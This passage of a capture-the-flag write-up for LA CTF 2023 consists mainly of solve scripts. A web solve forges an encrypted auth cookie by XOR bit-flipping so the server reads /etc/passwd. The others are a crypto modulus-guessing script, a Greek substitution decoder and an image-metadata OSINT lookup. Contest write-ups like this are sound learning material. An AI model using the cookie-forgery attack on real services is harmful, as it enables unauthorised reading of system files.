auth = get_cookie()
auth = unquote(auth)
[iv, authTag, ct] = auth.split(".")

new_tmpfile = b'{"tmpfile":"/etc/passwd"}'
partial_tmpfile = b'{"tmpfile":"/tmp/pastestore/"}'
new_ct = xor(new_tmpfile, xor(partial_tmpfile, b64decode(ct)))
new_ct = b64encode(new_ct).decode()

new_auth = f"{iv}.{authTag}.{new_ct}"
print("new cookie: "+new_auth)

a = requests.get(URL, cookies={"auth": new_auth})
print(a.text)
```
# Crypto
---
## chinese-lazy-theorem-1

```python
from pwn import *

host = "lac.tf"
r = remote(host, "31110")
p = int(r.recvline().strip().decode())
print('p =',p)
q = int(r.recvline().strip().decode())
print('q =',q)
n = str(p * q)
print('n =',n)

r.sendlineafter(b">> ", b'1')
r.sendlineafter(b"Type your modulus here: ", n.encode())
modulus = r.recvline().strip().decode()
print('mod =',modulus)

r.sendlineafter(b">> ", b'2')
r.sendlineafter(b"Type your guess here: ", modulus.encode())
print()
print(r.recvline().decode())
```

![](Pasted%20image%2020230214115929.png)

## greek cipher

```python
from collections import OrderedDict
from string import ascii_lowercase
'''
# lactf{i_guess_using_many_greek_characters_didn't_stop_you._well_played_i_must_say.congrats!}
'''
def decrypt(greek, key):
    decrypted_str = greek.translate(str.maketrans(key, ascii_lowercase))
    return decrypted_str

def replace_all(text, dic):
    for i, j in dic.items():
        text = text.replace(i, j)
    return text

# Ref: https://www.rapidtables.com/math/symbols/greek_alphabet.html
od = OrderedDict([
    ("α", "a"), ("β", "b"),
    ("ς", "c"), ("δ", "d"),
    ("ε", "e"), ("\\x01", "f"),
    ("γ", "g"), ("χ", "h"),
    ("ι", "i"), ("τ", "j"),
    ("κ", "k"), ("λ", "l"),
    ("μ", "m"), ("ν", "n"),
    ("ο", "o"), ("π", "p"),
    ("ρ", "r"), ("η", "q"),
    ("σ", "s"), ("θ", "t"), 
    ("υ", "u"), ("\\x02", "v"),
    ("ω", "w"), ("ξ", "x"),
    ("ψ", "y"), ("ζ", "z")
    ])

txtFile = "greek.txt"
txt = open(txtFile, 'r').read()

# sxmkgdeqchaojzpyfrtinulvwb (Brute)
# decode.fr :
# ⇒ SXMKGDEQCHAOJZPYBRTINULFWV (Original Encryption Alphabet)
key = "SXMKGDEQCHAOJZPYBRTINULFWV".lower()

s = str(txt)
cipher = replace_all(s, od)

print(cipher)
print()
print(decrypt(cipher, key))
```

# Misc
---
## CATS!

```python
#!/usr/bin/env python3
from hachoir.parser import createParser
from hachoir.metadata import extractMetadata
from googlesearch import search
'''
Answer is the domain of the website for this location.
For example, if the answer was ucla, the flag would be lactf{ucla.edu}.
'''
filename = 'CATS.jpeg'

parser = createParser(filename)
metadata = extractMetadata(parser)

for line in metadata.exportPlaintext():
    print(line)

print()

flag = "lactf{"
term = "Lanai Cat Sanctuary" # from metadata
for j in search(term, num_results=1):
    fl = j.strip("https://")

print(flag+fl+'}')
```

# Another writeup from our team

https://github.com/daffainfo/ctf-writeup/tree/main/LACTF%202023
Daftar chall:
- college-tour
- my-chemical-romance
- one-more-time-pad
- rolling in the mud
- discord
- hidden in plain sheets
- hike to where

https://github.com/hailgodmadoka/ctf-writeup/tree/main/lactf-upload
Daftar chall:
- rev - string-cheese
- rev - caterpillar
- rev - finals-simulator
- rev - universal
- rev - ctfd-plus
- rev - switcheroo 

